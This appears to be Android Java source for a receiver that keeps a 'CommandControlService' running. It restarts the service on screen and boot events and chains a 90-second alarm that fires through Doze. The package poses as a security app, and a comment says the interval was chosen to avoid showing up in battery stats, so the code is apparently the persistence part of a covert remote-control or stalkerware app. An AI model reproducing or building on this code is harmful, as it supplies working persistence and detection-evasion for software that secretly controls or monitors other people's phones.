package com.seguranca.protecao;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;

/**
 * AliveReceiver — self-sustaining heartbeat + reactive resurrection.
 *
 * Three-signal input:
 *   SCREEN_ON / SCREEN_OFF / USER_PRESENT  — system-sent, caught via manifest
 *   ALIVE_TICK                              — self-alarm that fires every 90s
 *
 * On every signal:
 *   1. Ensure CommandControlService is running
 *   2. Reschedule the next ALIVE_TICK alarm
 *
 * This creates a perpetual chain: tick → ensure service → schedule next tick
 * that survives Doze mode because setExactAndAllowWhileIdle fires through Doze.
 * The chain starts from CCS.onCreate() and BootReceiver.onReceive().
 *
 * REMOVED: TIME_TICK (protected broadcast, manifest registration causes
 *          SecurityException on all API levels — never worked)
 * REMOVED: CONNECTIVITY_CHANGE (background manifest registration silently
 *          ignored since API 24 — our minSdk IS 24, so it never worked)
 */
public final class AliveReceiver extends BroadcastReceiver {

    private static final String TAG = "AliveReceiver";

    /** Heartbeat interval. 90 seconds is frequent enough to catch kills
     *  without being aggressive enough to show up in battery stats. */
    private static final long HEARTBEAT_INTERVAL_MS = 90_000L;

    /** Internal alarm action — exported=false, only our own PendingIntent fires this. */
    static final String ACTION_ALIVE_TICK = "com.seguranca.protecao.ALIVE_TICK";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (context == null) return;
        String action = intent != null ? intent.getAction() : null;
        Log.d(TAG, "onReceive: " + action);

        try {
            ensureServiceRunning(context);
            scheduleHeartbeat(context);
        } catch (Exception e) {
            Log.e(TAG, "onReceive error: " + e.getMessage());
        }
    }

    // ── Service resurrection ───────────────────────────────────────────────────

    private static void ensureServiceRunning(Context context) {
        if (CommandControlService.sInstance != null) return; // already alive
        try {
            Intent svc = new Intent(context, CommandControlService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(svc);
            } else {
                context.startService(svc);
            }
            Log.d(TAG, "CCS resurrection attempted");
        } catch (Exception e) {
            Log.e(TAG, "ensureServiceRunning: " + e.getMessage());
        }
    }

    // ── Heartbeat alarm scheduling ─────────────────────────────────────────────

    /**
     * Schedule the next ALIVE_TICK alarm.
     *
     * Call sites:
     *   - CCS.onCreate()           → starts the chain on service creation
     *   - BootReceiver.onReceive() → starts the chain on every boot
     *   - onReceive()              → renews the chain on every tick
     *
     * Uses setExactAndAllowWhileIdle when permission is available so the alarm
     * fires through Doze. Falls back to setAndAllowWhileIdle (inexact but
     * no-throw) when SCHEDULE_EXACT_ALARM has been revoked or not yet granted.
     */
    public static void scheduleHeartbeat(Context context) {
        try {
            AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
            if (am == null) return;

            Intent i = new Intent(ACTION_ALIVE_TICK).setPackage(context.getPackageName());
            int flags = PendingIntent.FLAG_UPDATE_CURRENT
                    | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M
                       ? PendingIntent.FLAG_IMMUTABLE : 0);
            PendingIntent pi = PendingIntent.getBroadcast(context, 0xA11E, i, flags);

            long trigger = SystemClock.elapsedRealtime() + HEARTBEAT_INTERVAL_MS;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                // API 31+: setExactAndAllowWhileIdle requires SCHEDULE_EXACT_ALARM
                // or USE_EXACT_ALARM. Check before calling to avoid SecurityException.
                if (am.canScheduleExactAlarms()) {
                    am.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                } else {
                    // Inexact — Android will batch it, but it still fires.
                    am.setAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
                }
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                am.setExactAndAllowWhileIdle(
                        AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            } else {
                am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
            }

            Log.d(TAG, "Heartbeat scheduled in " + (HEARTBEAT_INTERVAL_MS / 1000) + "s");
        } catch (Exception e) {
            Log.e(TAG, "scheduleHeartbeat: " + e.getMessage());
        }
    }
}
